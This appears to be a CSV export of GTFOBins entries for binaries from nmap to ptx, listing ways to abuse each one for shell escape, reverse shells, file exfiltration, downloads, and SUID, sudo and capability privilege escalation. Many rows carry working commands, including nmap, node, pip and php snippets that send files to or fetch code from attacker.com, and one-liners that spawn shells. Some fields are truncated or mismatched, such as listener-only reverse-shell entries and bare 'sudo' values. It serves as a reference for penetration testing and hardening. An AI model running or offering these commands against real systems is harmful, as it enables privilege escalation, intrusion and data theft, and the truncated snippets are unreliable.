nmap,File upload,https://gtfobins.github.io/gtfobins/nmap/#file-upload,It can exfiltrate files on the network.,"RHOST=attacker.com
RPORT=8080
LFILE=file_to_send
nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE"
nmap,File download,https://gtfobins.github.io/gtfobins/nmap/#file-download,It can download remote files.,php -S 0.0.0.0:8080
nmap,File write,https://gtfobins.github.io/gtfobins/nmap/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","TF=$(mktemp)
echo 'local f=io.open(""file_to_write"", ""wb""); f:write(""data""); io.close(f);' > $TF
nmap --script=$TF"
nmap,File read,https://gtfobins.github.io/gtfobins/nmap/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","TF=$(mktemp)
echo 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);' > $TF
nmap --script=$TF"
nmap,SUID,https://gtfobins.github.io/gtfobins/nmap/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
nmap,Sudo,https://gtfobins.github.io/gtfobins/nmap/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nmap,Limited SUID,https://gtfobins.github.io/gtfobins/nmap/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
node,Shell,https://gtfobins.github.io/gtfobins/node/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"node -e 'require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'"
node,Reverse shell,https://gtfobins.github.io/gtfobins/node/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
node,Bind shell,https://gtfobins.github.io/gtfobins/node/#bind-shell,It can bind a shell to a local port to allow remote network access.,nc target.com 12345
node,File upload,https://gtfobins.github.io/gtfobins/node/#file-upload,It can exfiltrate files on the network.,"export URL=http://attacker.com
export LFILE=file_to_send
node -e 'require(""fs"").createReadStream(process.env.LFILE).pipe(require(""http"").request(process.env.URL))'"
node,File download,https://gtfobins.github.io/gtfobins/node/#file-download,It can download remote files.,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
node -e 'require(""http"").get(process.env.URL, res => res.pipe(require(""fs"").createWriteStream(process.env.LFILE)))'"
node,File write,https://gtfobins.github.io/gtfobins/node/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","node -e 'require(""fs"").writeFileSync(""file_to_write"", ""DATA"")'"
node,File read,https://gtfobins.github.io/gtfobins/node/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","node -e 'process.stdout.write(require(""fs"").readFileSync(""/bin/ls""))'"
node,SUID,https://gtfobins.github.io/gtfobins/node/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
node,Sudo,https://gtfobins.github.io/gtfobins/node/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
node,Capabilities,https://gtfobins.github.io/gtfobins/node/#capabilities,"If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",CAP_SETUID
nohup,Shell,https://gtfobins.github.io/gtfobins/nohup/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)"""
nohup,Command,https://gtfobins.github.io/gtfobins/nohup/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"COMMAND='/usr/bin/id'
nohup ""$COMMAND""
cat nohup.out"
nohup,SUID,https://gtfobins.github.io/gtfobins/nohup/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
nohup,Sudo,https://gtfobins.github.io/gtfobins/nohup/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
npm,Shell,https://gtfobins.github.io/gtfobins/npm/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,npm exec /bin/sh
npm,Sudo,https://gtfobins.github.io/gtfobins/npm/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nroff,Shell,https://gtfobins.github.io/gtfobins/nroff/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp -d)
echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
GROFF_BIN_PATH=$TF nroff"
nroff,File read,https://gtfobins.github.io/gtfobins/nroff/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
nroff $LFILE"
nroff,Sudo,https://gtfobins.github.io/gtfobins/nroff/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nsenter,Shell,https://gtfobins.github.io/gtfobins/nsenter/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,nsenter /bin/sh
nsenter,Sudo,https://gtfobins.github.io/gtfobins/nsenter/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ntpdate,File read,https://gtfobins.github.io/gtfobins/ntpdate/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ntpdate -a x -k $LFILE -d localhost"
ntpdate,SUID,https://gtfobins.github.io/gtfobins/ntpdate/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ntpdate,Sudo,https://gtfobins.github.io/gtfobins/ntpdate/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
octave,Shell,https://gtfobins.github.io/gtfobins/octave/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"octave-cli --eval 'system(""/bin/sh"")'"
octave,File write,https://gtfobins.github.io/gtfobins/octave/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","octave-cli --eval 'filename = ""file_to_write""; fid = fopen(filename, ""w""); fputs(fid, ""DATA""); fclose(fid);'"
octave,File read,https://gtfobins.github.io/gtfobins/octave/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","octave-cli --eval 'format none; fid = fopen(""file_to_read""); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'"
octave,Sudo,https://gtfobins.github.io/gtfobins/octave/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
octave,Limited SUID,https://gtfobins.github.io/gtfobins/octave/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
od,File read,https://gtfobins.github.io/gtfobins/od/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
od -An -c -w9999 ""$LFILE"""
od,SUID,https://gtfobins.github.io/gtfobins/od/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
od,Sudo,https://gtfobins.github.io/gtfobins/od/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
openssl,Reverse shell,https://gtfobins.github.io/gtfobins/openssl/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
openssl,File upload,https://gtfobins.github.io/gtfobins/openssl/#file-upload,It can exfiltrate files on the network.,"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save"
openssl,File download,https://gtfobins.github.io/gtfobins/openssl/#file-download,It can download remote files.,"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send"
openssl,File write,https://gtfobins.github.io/gtfobins/openssl/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
echo DATA | openssl enc -out ""$LFILE"""
openssl,File read,https://gtfobins.github.io/gtfobins/openssl/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
openssl enc -in ""$LFILE"""
openssl,Library load,https://gtfobins.github.io/gtfobins/openssl/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,openssl req -engine ./lib.so
openssl,SUID,https://gtfobins.github.io/gtfobins/openssl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
openssl,Sudo,https://gtfobins.github.io/gtfobins/openssl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
openvpn,Shell,https://gtfobins.github.io/gtfobins/openvpn/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
openvpn,File read,https://gtfobins.github.io/gtfobins/openvpn/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
openvpn --config ""$LFILE"""
openvpn,SUID,https://gtfobins.github.io/gtfobins/openvpn/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
openvpn,Sudo,https://gtfobins.github.io/gtfobins/openvpn/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
openvt,Sudo,https://gtfobins.github.io/gtfobins/openvt/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
opkg,Sudo,https://gtfobins.github.io/gtfobins/opkg/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pandoc,Shell,https://gtfobins.github.io/gtfobins/pandoc/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,lua
pandoc,File write,https://gtfobins.github.io/gtfobins/pandoc/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
echo DATA | pandoc -t plain -o ""$LFILE"""
pandoc,File read,https://gtfobins.github.io/gtfobins/pandoc/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
pandoc -t plain ""$LFILE"""
pandoc,SUID,https://gtfobins.github.io/gtfobins/pandoc/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
pandoc,Sudo,https://gtfobins.github.io/gtfobins/pandoc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pandoc,Limited SUID,https://gtfobins.github.io/gtfobins/pandoc/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
paste,File read,https://gtfobins.github.io/gtfobins/paste/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
paste $LFILE"
paste,SUID,https://gtfobins.github.io/gtfobins/paste/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
paste,Sudo,https://gtfobins.github.io/gtfobins/paste/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pax,File read,https://gtfobins.github.io/gtfobins/pax/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",tar
pdb,Shell,https://gtfobins.github.io/gtfobins/pdb/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo 'import os; os.system(""/bin/sh"")' > $TF
pdb $TF
cont"
pdb,Sudo,https://gtfobins.github.io/gtfobins/pdb/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pdflatex,Shell,https://gtfobins.github.io/gtfobins/pdflatex/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
pdflatex,File read,https://gtfobins.github.io/gtfobins/pdflatex/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -"
pdflatex,Sudo,https://gtfobins.github.io/gtfobins/pdflatex/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pdflatex,Limited SUID,https://gtfobins.github.io/gtfobins/pdflatex/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
pdftex,Shell,https://gtfobins.github.io/gtfobins/pdftex/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,pdftex --shell-escape '\write18{/bin/sh}\end'
pdftex,Sudo,https://gtfobins.github.io/gtfobins/pdftex/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pdftex,Limited SUID,https://gtfobins.github.io/gtfobins/pdftex/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
perf,Shell,https://gtfobins.github.io/gtfobins/perf/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,perf stat /bin/sh
perf,SUID,https://gtfobins.github.io/gtfobins/perf/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
perf,Sudo,https://gtfobins.github.io/gtfobins/perf/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
perl,Shell,https://gtfobins.github.io/gtfobins/perl/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"perl -e 'exec ""/bin/sh"";'"
perl,Reverse shell,https://gtfobins.github.io/gtfobins/perl/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
perl,File read,https://gtfobins.github.io/gtfobins/perl/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
perl -ne print $LFILE"
perl,SUID,https://gtfobins.github.io/gtfobins/perl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
perl,Sudo,https://gtfobins.github.io/gtfobins/perl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
perl,Capabilities,https://gtfobins.github.io/gtfobins/perl/#capabilities,"If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",CAP_SETUID
perlbug,Shell,https://gtfobins.github.io/gtfobins/perlbug/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'
perlbug,Sudo,https://gtfobins.github.io/gtfobins/perlbug/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pexec,Shell,https://gtfobins.github.io/gtfobins/pexec/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,pexec /bin/sh
pexec,SUID,https://gtfobins.github.io/gtfobins/pexec/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
pexec,Sudo,https://gtfobins.github.io/gtfobins/pexec/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pg,Shell,https://gtfobins.github.io/gtfobins/pg/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"pg /etc/profile
!/bin/sh"
pg,File read,https://gtfobins.github.io/gtfobins/pg/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",pg file_to_read
pg,SUID,https://gtfobins.github.io/gtfobins/pg/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
pg,Sudo,https://gtfobins.github.io/gtfobins/pg/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
php,Shell,https://gtfobins.github.io/gtfobins/php/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"export CMD=""/bin/sh""
php -r 'system(getenv(""CMD""));'"
php,Command,https://gtfobins.github.io/gtfobins/php/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"export CMD=""id""
php -r '$p = array(array(""pipe"",""r""),array(""pipe"",""w""),array(""pipe"", ""w""));$h = @proc_open(getenv(""CMD""), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'"
php,Reverse shell,https://gtfobins.github.io/gtfobins/php/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
php,File upload,https://gtfobins.github.io/gtfobins/php/#file-upload,It can exfiltrate files on the network.,"LHOST=0.0.0.0
LPORT=8888
php -S $LHOST:$LPORT"
php,File download,https://gtfobins.github.io/gtfobins/php/#file-download,It can download remote files.,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
php -r '$c=file_get_contents(getenv(""URL""));file_put_contents(getenv(""LFILE""), $c);'"
php,File write,https://gtfobins.github.io/gtfobins/php/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","export LFILE=file_to_write
php -r 'file_put_contents(getenv(""LFILE""), ""DATA"");'"
php,File read,https://gtfobins.github.io/gtfobins/php/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","export LFILE=file_to_read
php -r 'readfile(getenv(""LFILE""));'"
php,SUID,https://gtfobins.github.io/gtfobins/php/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
php,Sudo,https://gtfobins.github.io/gtfobins/php/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
php,Capabilities,https://gtfobins.github.io/gtfobins/php/#capabilities,"If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",CAP_SETUID
pic,Shell,https://gtfobins.github.io/gtfobins/pic/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"pic -U
.PS
sh X sh X"
pic,File read,https://gtfobins.github.io/gtfobins/pic/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
pic $LFILE"
pic,Sudo,https://gtfobins.github.io/gtfobins/pic/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pic,Limited SUID,https://gtfobins.github.io/gtfobins/pic/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
pico,Shell,https://gtfobins.github.io/gtfobins/pico/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"pico
^R^X
reset; sh 1>&0 2>&0"
pico,File write,https://gtfobins.github.io/gtfobins/pico/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","pico file_to_write
DATA
^O"
pico,File read,https://gtfobins.github.io/gtfobins/pico/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",pico file_to_read
pico,Sudo,https://gtfobins.github.io/gtfobins/pico/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pico,Limited SUID,https://gtfobins.github.io/gtfobins/pico/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
pidstat,Command,https://gtfobins.github.io/gtfobins/pidstat/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"COMMAND=id
pidstat -e $COMMAND"
pidstat,SUID,https://gtfobins.github.io/gtfobins/pidstat/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
pidstat,Sudo,https://gtfobins.github.io/gtfobins/pidstat/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pip,Shell,https://gtfobins.github.io/gtfobins/pip/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp -d)
echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
pip install $TF"
pip,Reverse shell,https://gtfobins.github.io/gtfobins/pip/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,"socat file:`tty`,raw,echo=0 tcp-listen:12345"
pip,File upload,https://gtfobins.github.io/gtfobins/pip/#file-upload,It can exfiltrate files on the network.,"export URL=http://attacker.com/
export LFILE=file_to_send
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' > $TF/setup.py
pip install $TF"
pip,File download,https://gtfobins.github.io/gtfobins/pip/#file-download,It can download remote files.,"export URL=http://attacker.com/file_to_get
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])' > $TF/setup.py
pip install $TF"
pip,File write,https://gtfobins.github.io/gtfobins/pip/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo ""open('$LFILE','w+').write('DATA')"" > $TF/setup.py
pip install $TF"
pip,File read,https://gtfobins.github.io/gtfobins/pip/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","TF=$(mktemp -d)
echo 'raise Exception(open(""file_to_read"").read())' > $TF/setup.py
pip install $TF"
pip,Library load,https://gtfobins.github.io/gtfobins/pip/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,"TF=$(mktemp -d)
echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py
pip install $TF"
pip,Sudo,https://gtfobins.github.io/gtfobins/pip/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pkexec,Sudo,https://gtfobins.github.io/gtfobins/pkexec/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pkg,Sudo,https://gtfobins.github.io/gtfobins/pkg/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
posh,Shell,https://gtfobins.github.io/gtfobins/posh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,posh
posh,Sudo,https://gtfobins.github.io/gtfobins/posh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
posh,Limited SUID,https://gtfobins.github.io/gtfobins/posh/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
pr,File read,https://gtfobins.github.io/gtfobins/pr/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
pr -T $LFILE"
pr,SUID,https://gtfobins.github.io/gtfobins/pr/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
pr,Sudo,https://gtfobins.github.io/gtfobins/pr/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pry,Shell,https://gtfobins.github.io/gtfobins/pry/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"pry
system(""/bin/sh"")"
pry,Sudo,https://gtfobins.github.io/gtfobins/pry/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pry,Limited SUID,https://gtfobins.github.io/gtfobins/pry/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
psftp,Shell,https://gtfobins.github.io/gtfobins/psftp/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"psftp
!/bin/sh"
psftp,Sudo,https://gtfobins.github.io/gtfobins/psftp/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
psftp,Limited SUID,https://gtfobins.github.io/gtfobins/psftp/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
psql,Shell,https://gtfobins.github.io/gtfobins/psql/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"psql
\?
!/bin/sh"
psql,Sudo,https://gtfobins.github.io/gtfobins/psql/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ptx,File read,https://gtfobins.github.io/gtfobins/ptx/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ptx -w 5000 ""$LFILE"""
